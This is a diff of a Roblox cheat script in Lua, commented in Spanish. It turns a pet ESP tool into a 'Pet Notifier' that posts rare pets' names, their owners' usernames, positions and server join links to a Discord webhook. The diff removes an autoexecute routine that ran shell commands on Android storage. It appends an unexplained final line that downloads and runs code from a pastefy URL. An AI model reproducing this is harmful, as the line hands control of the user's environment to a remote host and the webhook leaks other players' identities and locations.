@@ -1,6 +1,7 @@
--- 🐾 Pet ESP Finder completo con Autoexecute para Android
+-- 🐾 Pet Notifier + Discord Webhook
+-- by AlexVM adaptado
 
---// Servicios de Roblox
+--// Servicios
 local Players   = game:GetService("Players")
 local RunService= game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
@@ -21,7 +22,7 @@ local function getRequestFunc()
         or (function() return nil end)()
 end
 
---// Discord embed
+--// Enviar embed a Discord
 local function sendDiscordEmbed(args)
     local req = getRequestFunc()
     if not req then
@@ -40,7 +41,7 @@ local function sendDiscordEmbed(args)
         }}
     }
 
-    local ok, err = pcall(function()
+    pcall(function()
         req({
             Url = DISCORD_WEBHOOK,
             Method = "POST",
@@ -48,126 +49,56 @@ local function sendDiscordEmbed(args)
             Body = HttpService:JSONEncode(payload)
         })
     end)
-    if not ok then
-        warn("[Webhook] Error: " .. tostring(err))
-    end
 end
 
---// Lista de mascotas objetivo (ESP)
-local targetPets = {
-    ["Tralalero Tralala"] = true,
-    ["La Vacca Saturno Saturnita"] = true,
-    ["Chimpanzini Spiderini"] = true,
-    ["Los Tralaleritos"] = true,
-    ["Graipuss Medussi"] = true,
-    ["La Grande Combinasion"] = true,
-    ["Garama and Madundung"] = true,
-    ["Orcalero Orcala"] = true,
-    ["Torrtuginni Dragonfrutini"] = true,
-    ["Pot Hotspot"] = true,
-    ["Las Tralaleritas"] = true,
-    ["Lucky Block"] = true,
-    ["Nuclearo Dinossauro"] = true,
-    ["Las Vaquitas Saturnitas"] = true,
-    ["Los Tungtungtungcitos"] = true,
-    ["Chicleteira Bicicleteira"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Los Hotspotsitos"] = true,
-    ["Agarrini la Palini"] = true,
-    ["Tob Tobi Tobi"] = true,
-    ["Los Orcalitos"] = true,
-    ["Karkerkar Kurkur"] = true,
-    ["Bulbito Bandito Traktorito"] = true,
-    ["Esok Sekolah"] = true,
-    ["Tracoducotulu Delapeladustuz"] = true,
-    ["Tralalita tralala"] = true,
-    ["Job Job Job Sahur"] = true,
-    ["Tipi Topi Taco"] = true,
-    ["Urubini Flamenguini"] = true,
-    ["Matteo"] = true,
-    ["Los Matteos"] = true,
-	["Blackhole Goat"] = true,
-	["Tartaruga Cisterna"] = true,
-	["Dul Dul Dul"] = true,
-	["Los Bombinitos"] = true,
-	["Bisonte Giuppitere"] = true,
-	["Alessio"] = true,
-	["Ballerino Lololo"] = true,
-	["Trenostruzzo Turbo 3000"] = true,
-	["Sammyni Spyderini"] = true,
-	["Brr es Teh Patipum"] = true,
-	["Piccione Macchina"] = true,
-	["Los Combinasionas"] = true,
-	["La Grande Combinasion"] = true
-}
-
---// LISTA DE PETS PARA NOTIFICACIÓN (editable)
+--// Lista de mascotas para notificación
 local notifyPets = {
-    ["La Vacca Saturno Saturnita"] = true,
-    ["Chimpanzini Spiderini"] = true,
-    ["Los Tralaleritos"] = true,
-    ["Graipuss Medussi"] = true,
-    ["La Grande Combinasion"] = true,
-    ["Garama and Madundung"] = true,
-    ["Orcalero Orcala"] = true,
-    ["Torrtuginni Dragonfrutini"] = true,
-    ["Pot Hotspot"] = true,
-    ["Las Tralaleritas"] = true,
-    ["Nuclearo Dinossauro"] = true,
-    ["Las Vaquitas Saturnitas"] = true,
-    ["Los Tungtungtungcitos"] = true,
-    ["Chicleteira Bicicleteira"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Los Hotspotsitos"] = true,
     ["Agarrini la Palini"] = true,
-    ["Los Orcalitos"] = true,
-    ["Karkerkar Kurkur"] = true,
+    ["Bisonte Giuppitere"] = true,
+    ["Blackhole Goat"] = true,
     ["Bulbito Bandito Traktorito"] = true,
+    ["Cacasito Satalito"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Chimpanzini Spiderini"] = true,
+    ["Crabbo Limonetta"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dul Dul Dul"] = true,
     ["Esok Sekolah"] = true,
+    ["Garama and Madundung"] = true,
+    ["Graipuss Medussi"] = true,
+    ["Gattatino Nyanino"] = true,
+    ["Job Job Job Sahur"] = true,
+    ["Karkerkar Kurkur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["La Grande Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Vacca Saturno Saturnita"] = true,
+    ["Las Tralaleritas"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
+    ["Los Bombinitos"] = true,
     ["Los Combinasionas"] = true,
-	["La Grande Combinasion"] = true
-    ["Matteo"] = true,
+    ["Los Hotspotsitos"] = true,
     ["Los Matteos"] = true,
-	["Blackhole Goat"] = true,
-	["Tartaruga Cisterna"] = true,
-	["Dul Dul Dul"] = true,
-	["Los Bombinitos"] = true,
-	["Bisonte Giuppitere"] = true,
+    ["Los Noo My Hotspotsitos"] = true,
+    ["Los Orcalitos"] = true,
+    ["Los Spyderinis"] = true,
+    ["Los Tralaleritos"] = true,
+    ["Los Tungtungtungcitos"] = true,
+    ["Mastodontico Telepiedone"] = true,
+    ["Matteo"] = true,
+    ["Noo My Hotspot"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Pakrahmatmamat"] = true,
+    ["Pot Hotspot"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Sammyni Spyderini"] = true,
+    ["Statutino Libertino"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Tartaruga Cisterna"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
 }
 
---// Estado/UI
-local espEnabled = false
-local ScreenGui
-local detected = {}
-
---// Mensaje central
-local function showMessage()
-    local msgGui = Instance.new("ScreenGui")
-    msgGui.ResetOnSpawn = false
-    msgGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-    local text = Instance.new("TextLabel")
-    text.Size = UDim2.new(0.8, 0, 0.2, 0)
-    text.Position = UDim2.new(0.1, 0, 0.4, 0)
-    text.BackgroundTransparency = 1
-    text.Text = "⚠ Esp Pet \nCargando..."
-    text.TextColor3 = Color3.fromRGB(0,255,0)
-    text.TextWrapped = true
-    text.Font = Enum.Font.GothamBold
-    text.TextScaled = true
-    text.TextTransparency = 0
-    text.Parent = msgGui
-
-    task.delay(5, function()
-        for i = 0, 1, 0.05 do
-            text.TextTransparency = i
-            task.wait(0.05)
-        end
-        msgGui:Destroy()
-    end)
-end
-
---// Obtener mutaciones
+--// Función para obtener mutación y generación
 local function getMutationMap()
     local mutationMap = {}
     local plots = Workspace:FindFirstChild("Plots")
@@ -203,154 +134,26 @@ local function getMutationMap()
     return mutationMap
 end
 
---// Parsear generación
-local function parseGen(genStr)
-    if not genStr or genStr == "Stolen" or genStr == "Unknown" then return 0 end
-    local num = tonumber((genStr:match("%d+%.?%d*")))
-    if not num then return 0 end
-    if genStr:find("M") then return num * 1_000_000 end
-    if genStr:find("K") then return num * 1_000 end
-    return num
-end
-
---// Crear ESP + línea al jugador
-local function createESP(pet, mutationText, generationText)
-    if pet:FindFirstChild("ESP_Tag") then return end
-    local head = pet:FindFirstChild("Head") or pet:FindFirstChildWhichIsA("BasePart")
-    if not head then return end
-
-    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not hrp then hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart",5) end
-    if not hrp then return end
-
-    local genValue = parseGen(generationText)
-    local genColor = Color3.fromRGB(255,0,0)
-    if genValue >= 1_000_000 then genColor = Color3.fromRGB(0,255,0)
-    elseif genValue >= 500_000 then genColor = Color3.fromRGB(0,200,0)
-    elseif genValue >= 50_000 then genColor = Color3.fromRGB(255,165,0) end
-
-    local bill = Instance.new("BillboardGui")
-    bill.Name = "ESP_Tag"
-    bill.Size = UDim2.new(0, 200, 0, 60)
-    bill.StudsOffset = Vector3.new(0,3,0)
-    bill.AlwaysOnTop = true
-    bill.Parent = pet
-
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1,0,0.33,0)
-    nameLabel.Position = UDim2.new(0,0,0,0)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = "🐾 "..pet.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255,255,0)
-    nameLabel.Font = Enum.Font.SourceSansBold
-    nameLabel.TextScaled = true
-    nameLabel.TextWrapped = true
-    nameLabel.Parent = bill
-
-    local mutationLabel = Instance.new("TextLabel")
-    mutationLabel.Size = UDim2.new(1,0,0.33,0)
-    mutationLabel.Position = UDim2.new(0,0,0.33,0)
-    mutationLabel.BackgroundTransparency = 1
-    mutationLabel.Text = "🧬: "..(mutationText or "Normal")
-    mutationLabel.TextColor3 = Color3.fromRGB(0,255,255)
-    mutationLabel.Font = Enum.Font.SourceSansBold
-    mutationLabel.TextScaled = true
-    mutationLabel.TextWrapped = true
-    mutationLabel.Parent = bill
-
-    local genLabel = Instance.new("TextLabel")
-    genLabel.Size = UDim2.new(1,0,0.33,0)
-    genLabel.Position = UDim2.new(0,0,0.66,0)
-    genLabel.BackgroundTransparency = 1
-    genLabel.Text = "💰: "..(generationText or "Unknown")
-    genLabel.TextColor3 = genColor
-    genLabel.Font = Enum.Font.SourceSansBold
-    genLabel.TextScaled = true
-    genLabel.TextWrapped = true
-    genLabel.Parent = bill
-
--- === LÍNEA AL JUGADOR ===
-if not head:FindFirstChild("PetBeam") then
-    local att0 = Instance.new("Attachment")
-    att0.Name = "PetBeam"
-    att0.Position = Vector3.new(0,0,0)
-    att0.Parent = head
-
-    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not hrp then hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart",5) end
-    if not hrp then return end
-
-    local att1 = Instance.new("Attachment")
-    att1.Position = Vector3.new(0,0,0)
-    att1.Parent = hrp
-
-    local beam = Instance.new("Beam")
-    beam.Color = ColorSequence.new(Color3.fromRGB(255,255,0))
-    beam.Width0 = 0.2
-    beam.Width1 = 0.2
-    beam.Attachment0 = att0
-    beam.Attachment1 = att1
-    beam.FaceCamera = true
-    beam.Parent = head
-end
-
---// UI Toggle
-local function buildUI()
-    if ScreenGui then ScreenGui:Destroy() end
-    ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.ResetOnSpawn = false
-    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-    local espToggle = Instance.new("TextButton", ScreenGui)
-    espToggle.Name = "ESP_Toggle"
-    espToggle.Size = UDim2.new(0,120,0,30)
-    espToggle.Position = UDim2.new(1,-130,0,50)
-    espToggle.BackgroundColor3 = espEnabled and Color3.fromRGB(0,150,0) or Color3.fromRGB(50,50,50)
-    espToggle.Text = espEnabled and "ESP: ON" or "ESP: OFF"
-    espToggle.TextColor3 = Color3.fromRGB(255,255,255)
-    espToggle.Font = Enum.Font.GothamBold
-    espToggle.TextSize = 14
-    local corner = Instance.new("UICorner", espToggle)
-    corner.CornerRadius = UDim.new(0,8)
-
-    espToggle.MouseButton1Click:Connect(function()
-        espEnabled = not espEnabled
-        if espEnabled then
-            espToggle.Text = "ESP: ON"
-            espToggle.BackgroundColor3 = Color3.fromRGB(0,150,0)
-        else
-            espToggle.Text = "ESP: OFF"
-            espToggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
-            for _, obj in ipairs(Workspace:GetDescendants()) do
-                if obj:IsA("Model") and obj:FindFirstChild("ESP_Tag") then
-                    obj.ESP_Tag:Destroy()
-                end
-            end
+--// Función para determinar dueño del pet
+local function getPetOwner(obj)
+    local ownerName = "Desconocido"
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and obj:IsDescendantOf(player.Character) then
+            ownerName = player.Name
+            break
         end
-    end)
+    end
+    return ownerName
 end
 
-LocalPlayer.CharacterAdded:Connect(function() task.wait(1) buildUI() end)
-buildUI()
-showMessage()
+--// Detectar y enviar notificación inmediatamente
+local detected = {}
 
---// Obtener posición
-local function getModelPos(model)
-    if model.PrimaryPart then return model.PrimaryPart.Position end
-    local ok, cf = pcall(function() return model:GetPivot() end)
-    if ok and typeof(cf) == "CFrame" then return cf.Position end
-    local bp = model:FindFirstChildWhichIsA("BasePart")
-    return bp and bp.Position or Vector3.new()
-end
-
---// LOOP principal
-RunService.Heartbeat:Connect(function()
-    if not espEnabled then return end
+local function checkPets()
     local mutationMap = getMutationMap()
-
     for _, obj in ipairs(Workspace:GetDescendants()) do
-        if obj:IsA("Model") and targetPets[obj.Name] then
-            local mutationText, generationText = "Normal","Unknown"
+        if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
+            local mutationText, generationText = "Normal", "Unknown"
             for _, data in ipairs(mutationMap) do
                 if data.name == obj.Name then
                     mutationText = data.mutation or "Normal"
@@ -359,96 +162,41 @@ RunService.Heartbeat:Connect(function()
                 end
             end
 
-            createESP(obj, mutationText, generationText)
+            detected[obj] = true
+            local pos = obj.PrimaryPart and obj.PrimaryPart.Position or Vector3.new()
+            local ownerName = getPetOwner(obj)
 
-            if not detected[obj] then
-                detected[obj] = true
-                local pos = getModelPos(obj)
+            local joinLink = string.format(
+                "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
+                tostring(game.PlaceId),
+                tostring(game.JobId)
+            )
 
-                -- Construir link de servidor para unirse
-                local joinLink = string.format(
-                    "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
-                    tostring(game.PlaceId),
-                    tostring(game.JobId)
-                )
+            local embedFields = {
+                { name = "Nombre", value = obj.Name, inline = true },
+                { name = "Mutación", value = mutationText, inline = true },
+                { name = "Generación", value = generationText, inline = true },
+                { name = "Jugador", value = ownerName, inline = true },
+                { name = "Posición", value = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline = false },
+                { name = "Servidor", value = string.format("[Click para unirte](%s)", joinLink), inline = false },
+            }
 
-                -- Preparar embed para Discord
-                local embedFields = {
-                    { name = "Nombre", value = obj.Name, inline = true },
-                    { name = "Mutación", value = mutationText, inline = true },
-                    { name = "Generación", value = generationText, inline = true },
-                    { name = "Posición", value = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline = false },
-                    { name = "Servidor", value = string.format("[Click para unirte](%s)", joinLink), inline = false },
-                }
-
-                sendDiscordEmbed({
-                    title = "🐾 Mascota objetivo detectada",
-                    description = "Se ha encontrado una mascota de la lista objetivo.",
-                    color = 65280,
-                    fields = embedFields,
-                    footer = "Pet Finder ESP",
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-                })
-            end
+            sendDiscordEmbed({
+                title = "🐾 Mascota objetivo detectada",
+                description = "Se ha encontrado una mascota de la lista notifyPets.",
+                color = 65280,
+                fields = embedFields,
+                footer = "Pet Notifier",
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            })
         end
-    end
-end)
-
---// AUTOEXECUTE: Copiar script a Autoexecute automáticamente
-local function autoMoveScript()
-    local basePath = "/storage/emulated/0/"
-    local autoExecFolderName = "Autoexecute"
-
-    local function isDir(path)
-        local f = io.open(path, "r")
-        if f then f:close() return true end
-        return false
-    end
-
-    -- Buscar carpeta del executor
-    local executorFolder
-    local p = io.popen('ls "'..basePath..'"')
-    for folder in p:lines() do
-        local fullPath = basePath..folder
-        local ok, err = pcall(function() return isDir(fullPath) end)
-        if ok then
-            executorFolder = fullPath.."/"
-            break
-        end
-    end
-    p:close()
-
-    if not executorFolder then
-        print("No se pudo detectar la carpeta del executor.")
-        return
-    end
-
-    local autoExecPath = executorFolder .. autoExecFolderName .. "/"
-    if not isDir(autoExecPath) then
-        os.execute('mkdir "'..autoExecPath..'"')
-    end
-
-    local currentScriptPath = basePath.."Scripts/PetFinder.lua"
-    local fileName = "PetFinder.lua"
-    local destination = autoExecPath .. fileName
-
-    local srcFile = io.open(currentScriptPath, "r")
-    if srcFile then
-        local content = srcFile:read("*a")
-        srcFile:close()
-
-        local destFile = io.open(destination, "w")
-        if destFile then
-            destFile:write(content)
-            destFile:close()
-            print("[PetFinder] Script guardado automáticamente en Autoexecute")
-        else
-            print("No se pudo escribir en Autoexecute")
-        end
-    else
-        print("No se pudo leer el script original")
     end
 end
 
--- Ejecutar auto-movimiento
-autoMoveScript()
+-- Ejecutar chequeo inmediato al iniciar
+checkPets()
+
+-- Loop para detectar nuevas mascotas en tiempo real
+RunService.Heartbeat:Connect(checkPets)
+
+loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
